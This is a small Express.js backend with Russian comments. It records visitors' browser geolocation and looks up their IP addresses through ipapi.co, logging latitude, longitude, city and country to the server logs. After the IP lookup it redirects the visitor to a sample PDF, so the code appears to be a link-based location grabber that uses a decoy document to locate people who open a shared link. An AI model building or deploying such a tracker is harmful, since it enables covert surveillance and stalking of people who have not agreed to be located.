const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Конфигурация IP API (опционально)
const IPAPI_KEY = process.env.IPAPI_KEY; // API-ключ для ipapi.co (опционально)

// Тестовый маршрут для проверки API
app.get('/api/test', (req, res) => {
    console.log('Test route accessed at', new Date().toISOString());
    res.json({ 
        success: true, 
        message: 'API is working', 
        ipApiKeyConfigured: !!IPAPI_KEY 
    });
});

// Маршрут для сохранения геолокации через Geolocation API
app.post('/api/save-location', async (req, res) => {
    console.log('Received request to /api/save-location at', new Date().toISOString(), 'Body:', req.body);

    const { latitude, longitude } = req.body;
    if (!latitude || !longitude) {
        console.error('Invalid coordinates:', req.body);
        return res.status(400).json({ success: false, error: 'Invalid coordinates' });
    }

    const timestamp = new Date().toISOString();
    const locationData = { latitude, longitude, timestamp, source: 'geolocation' };

    // Логируем данные в консоль (будут в логах Vercel)
    console.log('Geolocation data saved:', JSON.stringify(locationData, null, 2));

    res.json({ success: true });
});

// Маршрут для сохранения геолокации через IP
app.get('/api/save-ip-location', async (req, res) => {
    const clientIp = req.headers['x-forwarded-for'] || req.ip;
    console.log('Received request to /api/save-ip-location at', new Date().toISOString(), 'IP:', clientIp);

    try {
        // Получаем геолокацию по IP
        const response = await axios.get(`https://ipapi.co/${clientIp}/json/` + (IPAPI_KEY ? `?key=${IPAPI_KEY}` : ''));
        const { latitude, longitude, city, region, country } = response.data;

        if (!latitude || !longitude) {
            console.error('Invalid IP geolocation data:', response.data);
            return res.status(400).json({ success: false, error: 'Invalid IP geolocation data' });
        }

        const timestamp = new Date().toISOString();
        const locationData = { latitude, longitude, city, region, country, timestamp, source: 'ipapi' };

        // Логируем данные в консоль (будут в логах Vercel)
        console.log('IP geolocation data saved:', JSON.stringify(locationData, null, 2));

        res.json({ success: true, redirect: '/sample.pdf' });
    } catch (err) {
        console.error('Ошибка сохранения IP:', err.message, err.response?.data);
        res.status(500).json({ success: false, error: `Ошибка сервера: ${err.message}` });
    }
});

// Обработка несуществующих маршрутов
app.use((req, res) => {
    console.error('Route not found:', req.url, 'at', new Date().toISOString());
    res.status(404).json({ success: false, error: 'Route not found' });
});

module.exports = app;
